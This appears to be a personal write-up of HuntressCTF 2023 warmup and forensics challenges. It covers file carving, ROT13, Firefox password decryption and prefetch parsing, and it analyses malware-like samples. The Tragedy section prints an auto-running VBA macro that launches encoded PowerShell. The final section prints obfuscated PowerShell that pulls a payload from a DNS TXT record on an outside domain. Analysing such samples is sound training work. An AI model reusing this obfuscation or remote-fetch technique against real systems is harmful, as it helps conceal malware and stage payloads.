Here are my solutions for the challenges I solved as a part of HuntressCTF 2023. 

- [[Warmups] F12 (Easy)](#f12)
- [[Warmups] String Cheese (Easy)](#string-cheese)
- [[Warmups] Layered Security (Easy)](#layered-security)
- [[Warmups] Comprezz (Easy)](#comprezz)
- [[Warmups] Chicken Wings (Easy)](#chicken-wings)
- [[Forensics] Opposable Thumbs (Easy)](#opposable-thumbs)
- [[Forensics] Dumpster Fire (Easy)](#dumpster-fire)
- [[Forensics] Wimble (Easy)](#wimble)
- [[Forensics] Traffic (Medium)](#traffic)
- [[Forensics] Tragedy (Medium)](#tragedy)
- [[Forensics] Texas Chainsaw Massacre: Tokyo Drift (Hard)](#texas-chainsaw-massacre-tokyo-drift)

## F12
During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:

```
<script type="text/javascript">
    function ctf() {
        window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
    }
</script>
```

To solve this I navigated manually to the `capture_the_flag.html` file on the webserver which contained the flag hidden from display by CSS inside of a `<span>` element:

```
<span style="display:none">
    flag{03e8ba07d1584c17e69ac95c341a2569}
</span>
```

## String Cheese
This challenge downloaded just a 612x408px JPEG picture of string cheese with one of the string cheeses split apart at the end. It still had EXIF data from iStockPhoto, but this wasn't where the flag was. Still thank you to Diana Taliun for the cheese photo! I did find the flag by running `strings` against it however:

```
$ strings cheese.jpg  | grep flag
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```

## Layered Security
This challenge presented me with a file called `layered_security` with no extension, so I ran the `file` command on it:

```
$ file layered_security 
layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
```

I added back the `.xcf` extension and opened it in GIMP. It was a photo with 10 layers of AI-generated faces, and one of them had the flag:

```
flag{9a64bc4a390cb0ce31452820ee562c3f}
```

## Comprezz
This challenge downloaded another extensionless file called `comprezz` and I took some time to figure out what I was working with:

```
$ file comprezz 
comprezz: compress'd data 16 bits
$ hexdump -C comprezz 
00000000  1f 9d 90 66 d8 84 39 b3  27 46 0e 1b 61 6e c4 a0  |...f..9.'F..an..|
00000010  91 03 86 98 1b 62 6a d4  18 43 43 86 18 33 34 68  |.....bj..CC..34h|
00000020  cc 90 71 83 86 99 1c 66  30 5a ec a3 00           |..q....f0Z...|
0000002d
```

This is Unix compression, so I can inflate it like this:

```
$ mv comprezz comprezz.z
$ uncompress comprezz.z
$ cat comprezz
flag{196a71490b7b55c42bf443274f9ff42b}
```

## Chicken Wings
This one was a little confusing at first. It was a file, again with no extension, in UTF-8 encoding that only had emojis in it. I thought it might be a rotational cipher, but it was 57 characters and the flag should be only 38. I then went down a rabbit hole of attempting to figure out how UTF-8 could be used to hide data before I googled the string and found out it was something related to the Wingdings font. There is an online translator that I used to get the flag:

```
Wingdings: ...
Translated: flag{e0791ce68f718188c0378b1c0a3bdc9e}
```

I guess the name was really a hint!

## CaesarMirror
This challenge gave us a file with the following contents:

```
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj 
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg 
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp 
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret 
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V 
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc 
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf 
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj 
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf 
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf 
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar 
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG 
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug 
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys 
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah 
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp 
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP    
```

I split it into left and right portions using regex. The left portion was ROT-13 encoded, and decoded to this:

```
     Oh boy! Wow, this warmup challenge
    definitely absolutely always love 
       to do with the very basic, common a
     your flag is flag{julius_ and th
 that you will need to solve this
  separate each part of the flag. The
   need just a little bit more. What ex
     this filler text look more enga
    Should we add spaces and try and m
 to make this filler text look bel
 simple, monospace-font text file l
   end? It looks like it! I hope it is good
and at this point you should have ever
    points. The beginning is marked with 
  and it includes English words separat
  brace. Wow! Now THAT is a CTF! Who 
            extent?? So
```

Whereas the right portion was encoded the same way and decoded to this:

```
    Caesar guy a medal!   
 could milk the caesar cipher to this   
 underscores, to end in a closing curly   
 flag prefix and the opening curly brace,   
 that you need to submit this flag for   
 The third part of your flag is reflection}   
 enough to me. Are we almost at the   
 solid square of letters within a    
 symmetrical? How many lines is enough   
 worthwhile? Should we add newlines?   
 should we include here to try and make   
 part of the flag is in_a_ but you do   
 I don't like trying to hide and    
 great start but it is not everything   
 classic CTF techniques! The first part of   
 to think up new and innovative things   
 was a lot of fun to put together! I so  
```

This gives us the final flag (you need to read the paragraphs as they give you explicit instructions on how to construct the flag):

```
flag{julius_in_a_reflection}
```

## Opposable Thumbs
This challenge just presented as a `thumbcache.db` file. This file is found on Windows systems, and is used as a cache to store thumbnails for files when they are viewed using Explorer. The flag was just displayed on one of these cached thumbnailes. I used Thumbcache Viewer to extract them.

```
flag{human_after_all}
```

## Dumpster Fire
This was just a tar archive of a filesystem from a Linux system. The challenge prompt hinted towards foxes and I could tell Firefox was installed on the system so I assumed it would be in one of Firefox's SQLite databases. These are located in the Firefox profiles and on Linux are usually located in a user's home directory. In this case they were under:

```
/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
```

For this challenge I used a software called DB Browser for SQLite. I saw that there was browsing history for a site `http://localhost:31337`. Firefox stores login credentials in a file called `logins.json`, and encrypts them with material from another file `key4.db`. In the `logins.json` file there was indeed an entry for this website, so I extracted the password using [firefox_decrypt](https://github.com/unode/firefox_decrypt).

In this case, the password was the flag.

```
$ python3 firefox_decrypt.py bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - profile.ini not found in bc1m1zlr.default-release/
2023-10-25 20:00:24,530 - WARNING - Continuing and assuming 'bc1m1zlr.default-release/' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Wimble
This challenge downloaded a 7z archive, and when inflated produced a `.wim` file. 

```
$ file fetch 
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
```

I didn't know what this extension was, but when I added it back to the file it behaved like an archive. Inside were a lot of prefetch files. In short, prefetch stores what files/libraries a program accesses in the first 10 seconds that it runs. I used a tool called PECmd by Eric Zimmerman to parse all of them:

```
PECmd.exe -d prefetch_files > parser_output.txt 
```

One of the files referenced was the flag:

```
61: \VOLUME{01d89fa75d2a9f57-245d3454}\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}
```

## Traffic
This was a 7z archive containing Zeek log exports.

## Tragedy
This file appeared to be a ZIP archive:

```
$ file tragedy_redux 
tragedy_redux: Zip archive data
```

But upon closer inspection, it had the following contents:

```
_rels
word
docProps
[Content_Types].xml
```

This indicates that it is actually a Microsoft Word file. These aren't really files per se, but ZIP archives. Regardless, inside the archive we see evidence that it contains an embedded VBA macro, such as a file named `vbaProject.bin`. I extracted this file as it is a compiled VBA resource. The tool I chose to attempt to decompile it was `oletools`:

```
python oletools\olevba.py ..\tragedy_redux\vbaProject.bin
```

Which produced the following output:

```
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

I wanted this in something that I can actually interpret and play around with (I am clueless when it comes to VBA) so I converted it to Python and printed some of the more interesting variables I wanted to track: 

```
def pears(beets):
    return chr(int(beets) - 17)

def strawberries(grapes):
    return grapes[:3]

def almonds(jelly):
    return jelly[3:]

def nuts(milk):
    oat_milk = ""
    while len(milk) > 0:
        oat_milk += pears(strawberries(milk))
        milk = almonds(milk)
    return oat_milk

def bears(cows):
    return cows[::-1]

def tragedy():
    apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    print("If ActiveDocument.Name <> " + nuts("131134127127118131063117128116"))
    water = nuts(apples)
    print(water)

tragedy()
```

This results in the following:

```
If ActiveDocument.Name <> runner.doc
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==
```

So it seems that the macro checks if the document is named `runner.doc`, and if so proceeds to executed an encoded powershell command. Powershell uses Base64 for its default encoding, and throwing this into CyberChef gives us the flag:

```
$flag="flag{63dcc82c30197768f4d458da12f618bc}"
```

## Texas Chainsaw Massacre Tokyo Drift
In this challenge, we are presented with an event log and told that a "rogue process" was detected on the endpoint when the user attempted to install a video game called "Texas Chainsaw Massacre." Scrolling through the event log I saw this interesting potentially related event:

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="MsiInstaller" /> 
  <EventID Qualifiers="0">1337</EventID> 
  <Version>0</Version> 
  <Level>4</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2023-10-10T16:02:47.088023300Z" /> 
  <EventRecordID>1785</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="9488" ThreadID="0" /> 
  <Channel>Application</Channel> 
  <Computer>DESKTOP-JU2PNRI</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.</Data> 
  <Binary>2828272E2028205...</Binary> 
  </EventData>
  </Event>
```

I've truncated the `<Binary>` XML element because it was rather large, but I threw it into CyberChef and got the following:

```
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

This looks like obfuscated powershell based on the presence of some noticable strings such as `CoMSpEc`, `vERboSEpreFeRenCe`, or `[rEGeX]::mAtcheS`. I used a tool called [PowerDecode](https://github.com/Malandrone/PowerDecode) to attempt to deobfuscate it and got the following script:

```
try {
    $TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue'; 
    if ($error.Count -eq 0) { 
        $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); 
        if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { 
            [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Write-Host 
        } 
    } 
    } catch { }
```

It did an amazing job, right? Anyway, it looks to be querying a TXT DNS record from the domain `eventlog.zip` (yes, .zip is now a valid TLD!). I ran a dig query to see what was there:

```
$ dig -t TXT eventlog.zip

; <<>> DiG 9.18.12-0ubuntu0.22.04.3-Ubuntu <<>> -t TXT eventlog.zip
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9491
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;eventlog.zip.			IN	TXT

;; ANSWER SECTION:
eventlog.zip.		3600	IN	TXT	"U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg=="
```

The Base64-encoded TXT record returns:

```
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```
